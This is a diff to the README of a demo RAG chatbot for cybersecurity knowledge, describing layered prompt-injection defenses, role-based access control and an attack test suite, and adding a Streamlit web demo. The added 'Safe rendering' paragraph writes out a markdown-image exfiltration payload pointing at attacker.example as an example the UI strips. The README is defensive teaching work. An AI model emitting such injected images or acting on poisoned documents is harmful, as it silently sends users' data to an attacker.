@@ -2,9 +2,11 @@
 
 A retrieval-augmented generation (RAG) chatbot for cybersecurity knowledge, built to show how LLM applications get attacked and how to defend them. It answers questions from a document knowledge base using a local LLM, and enforces **role-based access control** and **layered prompt-injection defenses**, backed by an automated attack test suite.
 
-**Stack:** Python · Ollama (Llama 3.2, runs locally) · ChromaDB · pytest
+**Stack:** Python · Ollama (Llama 3.2, runs locally) · ChromaDB · Streamlit · pytest
 
 **Result:** 40 automated tests: 11 attack prompts blocked, 8 legitimate security questions allowed, confidential data never retrieved for unauthorized roles, and a poisoned document neutralized end to end.
+
+![Web demo: switch users, toggle guardrails, and see which defense layer caught each attack](docs/demo.png)
 
 ---
 
@@ -65,6 +67,8 @@ flowchart LR
 **Layer 3: hardened prompt.** Documents are wrapped in `<document>` tags and declared untrusted data. Tags inside documents are neutralized so content can't "close" its own tag. A random canary code is planted in the system prompt on every request.
 
 **Layer 4: output check.** Answers are blocked if they contain the canary, system prompt text, secret patterns (AWS keys, private keys, passwords), or any email or URL that doesn't appear in the source documents.
+
+**Safe rendering.** The web UI strips markdown images from answers before displaying them. An injected image such as `![x](https://attacker.example/?data=...)` would otherwise make the browser send data to the attacker the moment the answer appears.
 
 **Logging.** Every block is written to `logs/security.log` with the event type and role. Users see only a generic refusal, so attackers don't learn which check fired.
 
@@ -131,6 +135,7 @@ ollama pull nomic-embed-text
 python -m src.ingest                       # build the vector database
 python -m src.chatbot                      # chat (log in as alex or sam)
 python -m src.chatbot --no-guardrails      # demo mode: see the attacks work
+streamlit run app.py                       # web demo in your browser
 python -m pytest -v                        # run all 40 tests
 ```
 
@@ -139,6 +144,7 @@ python -m pytest -v                        # run all 40 tests
 ## Project structure
 
 ```
+app.py            Streamlit web demo
 src/
   ingest.py       load and chunk documents, tag access level, store embeddings
   retriever.py    semantic search with role-based filtering
